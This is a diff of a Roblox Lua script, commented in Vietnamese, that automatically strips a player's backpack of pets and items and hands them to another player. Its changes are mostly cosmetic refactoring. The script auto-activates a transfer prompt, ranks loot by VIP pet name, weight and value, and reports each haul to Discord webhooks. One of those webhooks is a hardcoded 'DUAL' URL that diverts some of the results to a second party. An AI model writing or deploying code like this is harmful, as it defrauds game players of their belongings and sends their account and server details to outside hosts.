@@ -1,22 +1,20 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-local plr = Players.LocalPlayer
-local backpack = plr:WaitForChild("Backpack")
+local backpack = Players.LocalPlayer:WaitForChild("Backpack")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local modules = replicatedStorage:WaitForChild("Modules")
 
 -- CẤU HÌNH
-local PRIMARY_USERNAME = Username
-local PRIMARY_WEBHOOK = Webhook 
+local PRIMARY_USERNAME = Username 
+local PRIMARY_WEBHOOK = Webhook
 local DUAL_USERNAME = "namnnni2"
 local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
 local VALUE_THRESHOLD = 1_000_000_000_000 -- 1000 tỷ
 local AUTO_TRANSFER_DELAY = 0.3
 local HEAVY_WEIGHT = 10 -- Ngưỡng cân nặng để xác định pet nặng
 
--- DANH SÁCH PET VIP (CHỈ THÊM KHÔNG BỚT)
+-- DANH SÁCH PET VIP
 local VIP_PETS = {"Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "Butterfly", "Dragonfly", "Raccoon"}
 
 -- MODULE
@@ -28,7 +26,6 @@ local numberUtil = require(modules:WaitForChild("NumberUtil"))
 local currentPrompt = nil
 local isTransferring = false
 local connection = nil
-local trackingPlayer = nil
 
 -- ĐỊNH DẠNG SỐ
 local function formatNumber(n)
@@ -38,15 +35,12 @@ end
 -- TÍNH GIÁ TRỊ VÀ ĐỘ ƯU TIÊN
 local function calculatePriority(item)
     local priority = 0
-    -- Pet VIP
     if table.find(VIP_PETS, item.Name) then
         priority = priority + 1000
     end
-    -- Pet nặng (bất kỳ pet nào có weight >= HEAVY_WEIGHT)
     if (item.Weight or 0) >= HEAVY_WEIGHT then
         priority = priority + 500
     end
-    -- Giá trị
     priority = priority + (item.Value or 0)
     return priority
 end
@@ -62,7 +56,6 @@ local function sendWebhookNotification(items, totalValue, targetName)
     local webhookUrl = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
     local username = useDual and DUAL_USERNAME or PRIMARY_USERNAME
 
-    -- Kiểm tra xem có pet VIP hoặc pet nặng không
     local hasVIPOrHeavyPet = false
     for _, item in ipairs(items) do
         if table.find(VIP_PETS, item.Name) or (item.Weight or 0) >= HEAVY_WEIGHT then
@@ -71,7 +64,6 @@ local function sendWebhookNotification(items, totalValue, targetName)
         end
     end
 
-    -- Phân loại vật phẩm
     local categories = {
         {name = "💎 VIP Pets", items = {}},
         {name = "🏋️ Heavy Pets", items = {}},
@@ -91,7 +83,6 @@ local function sendWebhookNotification(items, totalValue, targetName)
         end
     end
 
-    -- Tạo nội dung
     local descriptionParts = {}
     for _, category in ipairs(categories) do
         if #category.items > 0 then
@@ -114,7 +105,7 @@ local function sendWebhookNotification(items, totalValue, targetName)
             color = useDual and 0xFFD700 or 0x00FF00,
             description = table.concat(descriptionParts, "\n"),
             fields = {
-                {name = "👤 Sender", value = plr.Name, inline = true},
+                {name = "👤 Sender", value = Players.LocalPlayer.Name, inline = true},
                 {name = "🎯 Receiver", value = targetName, inline = true},
                 {name = "💰 Total Value", value = "$"..formatNumber(totalValue), inline = true},
                 {name = "🔗 Quick Join", value = string.format("[Click Here](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), inline = false}
@@ -124,7 +115,6 @@ local function sendWebhookNotification(items, totalValue, targetName)
         }}
     }
 
-    -- Nếu có pet VIP hoặc pet nặng, thêm @everyone vào nội dung
     if hasVIPOrHeavyPet then
         payload.content = "@everyone"
     end
@@ -146,7 +136,7 @@ end
 
 -- CHỜ VẬT PHẨM BIẾN MẤT
 local function waitForItemRemoval(tool)
-    local timeout = 5 -- 5 giây timeout
+    local timeout = 5
     local startTime = os.time()
     while tool and tool.Parent == backpack do
         if os.time() - startTime > timeout then
@@ -173,7 +163,6 @@ local function createAutoPrompt(targetCharacter, targetName)
         if isTransferring then return end
         isTransferring = true
         
-        -- Quét và sắp xếp kho đồ
         local items = {}
         local totalValue = 0
         for _, tool in ipairs(backpack:GetChildren()) do
@@ -183,7 +172,7 @@ local function createAutoPrompt(targetCharacter, targetName)
                     Type = tool:GetAttribute("ItemType"),
                     Value = calculateItemValue(tool),
                     Weight = tool:GetAttribute("Weight"),
-                    Tool = tool -- Lưu cả tool reference
+                    Tool = tool
                 }
                 totalValue += item.Value
                 table.insert(items, item)
@@ -192,13 +181,11 @@ local function createAutoPrompt(targetCharacter, targetName)
         
         table.sort(items, sortByPriority)
         
-        -- Chuyển đồ theo thứ tự ưu tiên và chờ từng item
         local targetBackpack = Players:FindFirstChild(targetName):FindFirstChildOfClass("Backpack")
         if targetBackpack then
             for _, item in ipairs(items) do
                 if item.Tool and item.Tool.Parent == backpack then
                     item.Tool.Parent = targetBackpack
-                    -- Chờ đến khi item biến mất khỏi backpack
                     if not waitForItemRemoval(item.Tool) then
                         warn("Failed to transfer item:", item.Name)
                         break
@@ -208,7 +195,6 @@ local function createAutoPrompt(targetCharacter, targetName)
             end
         end
         
-        -- Gửi webhook
         sendWebhookNotification(items, totalValue, targetName)
         
         isTransferring = false
@@ -216,7 +202,6 @@ local function createAutoPrompt(targetCharacter, targetName)
     
     currentPrompt = prompt
     
-    -- Tự động kích hoạt sau 0.5 giây
     delay(0.5, function()
         if prompt and prompt.Parent then
             prompt:InputHoldBegin()
@@ -232,7 +217,7 @@ local function teleportAndFollow(targetPlayer)
     local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
     if not targetHRP then return end
     
-    local myCharacter = plr.Character
+    local myCharacter = Players.LocalPlayer.Character
     if not myCharacter then return end
     local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
     if not myHRP then return end
